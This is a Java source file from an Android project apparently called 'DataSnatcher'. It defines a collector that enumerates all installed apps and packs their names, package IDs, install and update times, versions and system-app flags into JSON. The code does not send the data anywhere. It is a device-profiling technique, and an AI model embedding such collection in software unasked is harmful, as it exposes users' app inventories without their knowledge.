package com.example.DataSnatcher.collector;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PermissionInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class ApplistInfoCollector implements IInfoCollector{

    private final Context context;

    public ApplistInfoCollector(Context context) {
        this.context = context;
    }

    @Override
    public String getCategory() {
        return "应用列表";
    }

    @Override
    public JSONObject collect() {
        JSONObject appListInfo = new JSONObject();
        PackageManager packageManager = context.getPackageManager();
        try {
            List<ApplicationInfo> installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONArray appArray = new JSONArray();
            for (ApplicationInfo appInfo : installedApps) {
                JSONObject app = new JSONObject();
                String appName = packageManager.getApplicationLabel(appInfo).toString();
                app.put("app_name", appName);
                app.put("package_name", appInfo.packageName);

                PackageInfo packageInfo = packageManager.getPackageInfo(appInfo.packageName, PackageManager.GET_PERMISSIONS);
                app.put("in_time", packageInfo.firstInstallTime);
                app.put("up_time", packageInfo.lastUpdateTime);
                app.put("version_name", packageInfo.versionName);
                app.put("version_code", packageInfo.versionCode);
                app.put("flags", appInfo.flags);

                int appType = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0 ? 1 : 0;
                app.put("app_type", appType);

                appArray.put(app);
            }
            appListInfo.put("applist", appArray);
        } catch (PackageManager.NameNotFoundException | JSONException e) {
            e.printStackTrace();
        }
        return appListInfo;
    }
}
